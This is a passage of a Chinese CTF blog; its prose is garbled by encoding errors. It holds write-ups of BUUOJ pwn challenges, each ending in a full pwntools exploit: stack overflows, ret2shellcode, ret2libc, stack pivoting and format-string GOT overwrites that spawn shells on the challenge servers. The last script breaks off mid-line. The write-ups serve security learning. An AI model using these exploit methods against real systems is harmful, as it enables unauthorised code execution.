class="line">main_addr = e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(read_got) +p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(fmtstr) + p64(printf_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25106</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">str</span> = p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">read_addr = u64(<span class="built_in">str</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå¾—åˆ°flag<del>è—çš„ä½ç½®å¥½æ·±å•Š</del></p><p><img src="https://i.loli.net/2020/10/09/L43Evc2IVdUWkCF.png" alt="F240_K_XDU@_4RS_JFVI~RP.png"></p><h1 id="0x01D-ez-pz-hackover-2016-ret2shellcode"><a href="#0x01D-ez-pz-hackover-2016-ret2shellcode" class="headerlink" title="0x01D.ez_pz_hackover_2016 - ret2shellcode"></a>0x01D.ez_pz_hackover_2016 - ret2shellcode</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œæš—ç¤ºæˆ‘ä»¬å¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p><p><img src="C:\Users\SUR\AppData\Roaming\Typora\typora-user-images\1606747425236.png" alt="1606747425236"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>åœ¨<code>chall()</code>å‡½æ•°ä¸­ç»™æˆ‘ä»¬æ³„éœ²äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œå¹¶è¯»å…¥1023å­—èŠ‚ï¼Œæ— æ³•æº¢å‡º</p><p><img src="https://i.loli.net/2020/11/30/nxCyhzXdESge4OH.png" alt="image.png"></p><p>ä½†æ˜¯åœ¨vulnå‡½æ•°ä¸­ä¼šæ‹·è´ä¸€æ¬¡æˆ‘ä»¬çš„è¾“å…¥ï¼Œ<strong>å¯ä»¥æº¢å‡º</strong></p><p><img src="https://i.loli.net/2020/11/30/ldt9YWcke8NvpUT.png" alt="image.png"></p><p>ç”±äºç»™äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘è¾“å…¥ä¸€æ®µshellcodeåè·³è½¬å³å¯</p><p>éœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹æ˜¯<code>vuln()</code>å‡½æ•°æ˜¯<strong>å°†ä¼ å…¥çš„å‚æ•°çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥memcpyçš„</strong>ï¼Œæ•…å®é™…ä¸Šä¼šé¢å¤–æ‹·è´0xec - 0xd0 &#x3D; 0x1cå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¡«å……åˆ°ebpæ‰€éœ€çš„paddingé•¿åº¦å…¶å®åªéœ€è¦0x32 - 0x1c &#x3D; 0x16å­—èŠ‚</p><p><img src="C:\Users\SUR\AppData\Roaming\Typora\typora-user-images\1606752784211.png" alt="1606752784211"></p><p>æ³„éœ²å‡ºæ¥çš„åœ°å€å’Œæˆ‘ä»¬æ‹·è´åˆ°çš„åœ°å€ä¸Šçš„shellcodeé—´è·ä¸º0x9ec - 0x9d0 &#x3D; 0x1cï¼Œç›´æ¥è·³è½¬è¿‡å»å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å› ä¸ºmemcpyæ‹·è´äº†é•¿è¾¾0x400å­—èŠ‚çš„å†…å®¹ï¼Œä¼šå°†æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ•°æ®å°½æ•°ç ´åï¼Œæ•…æˆ‘ä»¬åªèƒ½å‘æ‹·è´åçš„åœ°å€è·³</strong></p><p><img src="https://i.loli.net/2020/12/01/tKG7EIMTbcS3wLa.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/30/n5M1HGzuTxy7QZb.png" alt="_9T8_GI__708_M0FN1H~_GC.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./ez_pz_hackover_2016&quot;</span>) <span class="comment">#  remote(&quot;node3.buuoj.cn&quot;, 25809) # </span></span><br><span class="line">offset = <span class="number">0x16</span></span><br><span class="line">verify = <span class="string">b&quot;crashme\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets crash: &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;stack leak: &quot;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">payload = verify + <span class="string">b&#x27;A&#x27;</span> * (offset - <span class="built_in">len</span>(verify)) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(stack_leak - <span class="number">0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/12/01/P9gryD43xBNawEL.png" alt="image.png"></p><h1 id="0x01E-ciscn-2019-es-2-ret2text-stack-migration"><a href="#0x01E-ciscn-2019-es-2-ret2text-stack-migration" class="headerlink" title="0x01E.ciscn_2019_es_2 - ret2text + stack migration"></a>0x01E.ciscn_2019_es_2 - ret2text + stack migration</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/uifxqJUW9rIQpS1.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/Mdng1Imo6tPrkyC.png" alt="image.png"></p><p>å­˜åœ¨æº¢å‡ºï¼Œä¸”è¯»å–ä¸¤æ¬¡è¾“å‡ºä¸¤æ¬¡ï¼Œæ•…ç¬¬ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥å¡«å……0x28å­—èŠ‚è·å¾—ä¸€ä¸ªæ ˆä¸Šåœ°å€</p><p><img src="https://i.loli.net/2020/12/01/MIteH4sl7aKJORj.png" alt="image.png"></p><p>å­˜åœ¨systemå‡½æ•°</p><p>ç”±äºæº¢å‡ºåªæœ‰8ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬èƒ½å¤Ÿè·å¾—æ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘è¿›è¡Œ<strong>æ ˆè¿ç§»</strong>ï¼Œåœ¨æ ˆä¸Šæ„é€ ROPé“¾</p><p>é¢˜ç›®ä¸­åªç»™äº†<code>system()</code>å‡½æ•°ï¼Œæ²¡ç»™<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œä¸è¿‡ç”±äºæ ˆä¸Šåœ°å€å¯çŸ¥ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å°†ä¹‹è¯»å–åˆ°æ ˆä¸Š</p><p>gdbè°ƒè¯•å¯çŸ¥æˆ‘ä»¬çš„è¾“å…¥ä¸æ‰€æ³„éœ²åœ°å€é—´è·ä¸º0xe18 - 0xde0 &#x3D; 0x38</p><p><img src="https://i.loli.net/2020/12/01/WXw721cUfC9LDqQ.png" alt="image.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25040</span>) <span class="comment"># process(&quot;./ciscn_2019_es_2&quot;) #</span></span><br><span class="line">e = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">leave_ret = <span class="number">0x80485FD</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">payload2 = p32(e.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_leak-<span class="number">0x38</span> + <span class="number">12</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;A&#x27;</span> * (offset - <span class="built_in">len</span>(payload2)) + p32(stack_leak - <span class="number">0x38</span> - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/82JX5c3gmUfhuBd.png" alt="image.png"></p><h1 id="0x01F-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration"><a href="#0x01F-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration" class="headerlink" title="0x01F.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration"></a>0x01F.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/zX2NEbFpBKWCamq.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/9tqkz3s1byJDBId.png" alt="image.png"></p><p>ç¬¬ä¸€æ¬¡å¾€bssæ®µä¸Šè¯»å…¥0x200å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡å¾€æ ˆä¸Šè¯»å…¥0x20å­—èŠ‚ï¼Œ<strong>åªèƒ½åˆšå¥½æº¢å‡º8ä¸ªå­—èŠ‚</strong></p><p>æ•…è€ƒè™‘è¿›è¡Œæ ˆè¿ç§»å°†æ ˆè¿ç§»åˆ°bssæ®µä¸Š</p><p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">29227</span>) <span class="comment"># process(&quot;./spwn&quot;) #</span></span><br><span class="line">e = ELF(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x8048511</span></span><br><span class="line">payload1 = p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span> + p32(bss_addr - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload3 = p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/BGsMI7SmyxXAbLD.png" alt="image.png"></p><h1 id="0x020-jarvisoj-level3-ret2libc"><a href="#0x020-jarvisoj-level3-ret2libc" class="headerlink" title="0x020.jarvisoj_level3 - ret2libc"></a>0x020.jarvisoj_level3 - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/RVDX2UIegLHboN4.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/QZ9KJTgDafe3NMh.png" alt="image.png"></p><p>å­˜åœ¨120å­—èŠ‚çš„æº¢å‡º</p><p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26149)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/5lLM1IuKhdqHJwQ.png" alt="image.png"></p><blockquote><p>æ„Ÿè§‰ret2libcçš„é¢˜åŸºæœ¬éƒ½å¤§åŒå°å¼‚å•Šâ€¦</p></blockquote><h1 id="0x021-BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†"><a href="#0x021-BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†" class="headerlink" title="0x021.[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†"></a>0x021.[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†</h1><p>é¢˜ç›®åªç»™äº†ä¸€ä¸ªsshï¼Œå°è¯•è¿›è¡Œè¿æ¥</p><p><img src="https://i.loli.net/2020/12/01/WqAa8StsGKveMTw.png" alt="image.png"></p><p>å°è¯•ä¸€ä¸‹å‘ç°æˆ‘ä»¬æ— æ³•ç›´æ¥è·å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/BsjidqO7gZcCfEv.png" alt="image.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æƒé™ï¼Œå‘ç°åªæœ‰<code>ctf_pwn</code>ç”¨æˆ·ç»„æ‰æœ‰æƒé™</p><p><img src="https://i.loli.net/2020/12/01/ETx7LSG5zC9Zeul.png" alt="image.png"></p><p>æç¤ºå‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶testä¸å…¶æºç ï¼Œå°è¯•é˜…è¯»</p><p><img src="https://i.loli.net/2020/12/01/g7qk6h8j2BM4Y3T.png" alt="image.png"></p><p>è¯¥ç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¼šè¿‡æ»¤ä¸€éƒ¨åˆ†å­—ç¬¦</p><p>å°è¯•ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹å‰©ä½™çš„å¯ç”¨å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$ ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;`</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/2zWulrZ5IOGcELP.png" alt="image.png"></p><p>æˆ‘ä»¬å‘ç°åœ¨testç¨‹åºä¸­æœ‰æ•ˆç”¨æˆ·ç»„ä¸º<code>ctf_pwn</code>ï¼Œæ•…ä½¿ç”¨è¯¥ç¨‹åºè·å–ä¸€ä¸ªshellå³å¯è·å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/r4U1m3TiBjohkZF.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/12/01/j8LHM4DzXE6pZ5m.png" alt="image.png"></p><h1 id="0x022-BJDCTF-2nd-r2t4-fmtstr"><a href="#0x022-BJDCTF-2nd-r2t4-fmtstr" class="headerlink" title="0x022.[BJDCTF 2nd]r2t4 - fmtstr"></a>0x022.[BJDCTF 2nd]r2t4 - fmtstr</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/01/zPCHqKLigBI4Nwd.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/W6sVY2Hp4TFECBO.png" alt="image.png"></p><p>mainä¸­å­˜åœ¨æº¢å‡ºï¼Œä¸”å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="https://i.loli.net/2020/12/01/jIJCdMwZ9ufy3ti.png" alt="image.png"></p><p>å­˜åœ¨å¯ä»¥è¯»å–flagçš„åé—¨å‡½æ•°</p><p>ç®€å•å°è¯•å¯ä»¥å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬å…­ä¸ªå‚æ•°</p><p><img src="https://i.loli.net/2020/12/01/eI31RvsilqYKpTZ.png" alt="image.png"></p><p>æ•…è€ƒè™‘åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œä»»æ„åœ°å€å†™åŠ«æŒgotè¡¨ä¸­çš„__stack_chk_failä¸ºåé—¨å‡½æ•°åœ°å€å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>printf</code>å‡½æ•°é‡åˆ°<code>\x00</code>ä¼šå‘ç”Ÿæˆªæ–­ï¼Œæ•…ä¸èƒ½ç›´æ¥ä½¿ç”¨fmtstr_payloadï¼Œè€Œæ˜¯è¦ç”¨æ‰‹å†™çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./r2t4&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,25635)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line">payload = <span class="string">b&#x27;%64c%9$hn%1510c%10$hnaaa&#x27;</span> + p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]+<span class="number">2</span>) + p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>])<span class="comment">#fmtstr_payload(6,&#123;e.got[&#x27;__stack_chk_fail&#x27;]:backdoor&#125;)</span></span><br><span class="line">payload.ljust(<span class="number">100</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è·å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/3KvIRtcrT1z9LUm.png" alt="image.png"></p><h1 id="0x023-jarvisoj-fm-fmtstr"><a href="#0x023-jarvisoj-fm-fmtstr" class="headerlink" title="0x023.jarvisoj_fm - fmtstr"></a>0x023.jarvisoj_fm - fmtstr</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/01/NILo7xYAvaPjm9R.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="https://i.loli.net/2020/12/01/lJIRWsXmNeEP67B.png" alt="image.png"></p><p>å½“xä¸º4æ—¶ç›´æ¥getshellï¼Œxåœ¨bssæ®µä¸Š</p><p><img src="https://i.loli.net/2020/12/01/dzUnkYrhxHR5EiB.png" alt="image.png"></p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨ç¬¬13ä¸ªå‚æ•°çš„ä½ç½®</p><p><img src="https://i.loli.net/2020/12/01/hDVSnkOyfovmQdL.png" alt="image.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804A02C</span>:<span class="number">0x4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25865</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/u3UwrkKvGmgxW59.png" alt="image.png"></p><h1 id="0x024-jarvisoj-tell-me-something-ret2csu-ret2libc"><a href="#0x024-jarvisoj-tell-me-something-ret2csu-ret2libc" class="headerlink" title="0x024.jarvisoj_tell_me_something - ret2csu + ret2libc"></a>0x024.jarvisoj_tell_me_something - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/EbFBZKn2tPakdlg.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/ConYPhEF6378GWA.png" alt="image.png"></p><p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p><p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26270</span>)<span class="comment">#process(&#x27;./guestbook&#x27;) # </span></span><br><span class="line">e=  ELF(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">offset = <span 